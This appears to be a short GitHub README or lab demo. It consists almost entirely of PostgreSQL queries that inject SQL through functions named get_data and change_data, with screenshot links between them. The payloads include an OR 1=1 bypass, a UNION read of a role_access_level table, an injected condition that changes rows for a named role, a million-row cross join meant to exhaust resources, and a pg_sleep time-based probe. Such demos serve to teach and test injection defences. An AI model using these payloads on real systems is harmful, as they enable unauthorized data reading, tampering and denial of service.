SELECT * FROM get_data('1'' OR 1=1 -- ');

![1](https://user-images.githubusercontent.com/93474882/209405816-2bb1f85d-456b-465e-8daf-b1f3102d32db.png)

SELECT * FROM get_data('1'' UNION SELECT CAST(access_level AS INTEGER), 
CAST(role_name AS VARCHAR), 
CAST(NULL AS date) 
FROM role_access_level -- ');

![2](https://user-images.githubusercontent.com/93474882/209405849-af1c9565-99ce-48da-9260-acd1f409ab84.png)

SELECT * FROM change_data('1'' OR role_name = ''samer'' -- ', 3);

![3](https://user-images.githubusercontent.com/93474882/209405987-12bf6676-e05f-4300-a16d-46bfc53f1c14.png)

SELECT * FROM get_data('1'' UNION
(SELECT p1, 
CAST(p1 AS VARCHAR), 
CAST(p1 AS INTEGER)
FROM (SELECT generate_series p1 FROM generate_series (1,1000)) t1
CROSS JOIN (SELECT * FROM generate_series (1,1000) t2) t3) -- ');

![4](https://user-images.githubusercontent.com/93474882/209406168-1a29ad53-f82c-4d88-a63e-faa52fb10901.png)

SELECT * FROM get_data('1'' OR EXISTS (SELECT 1 FROM PG_SLEEP(30)) -- ');

![5](https://user-images.githubusercontent.com/93474882/209406259-455c8d7e-07f6-4ea8-aace-45a0afaeb6b9.png)


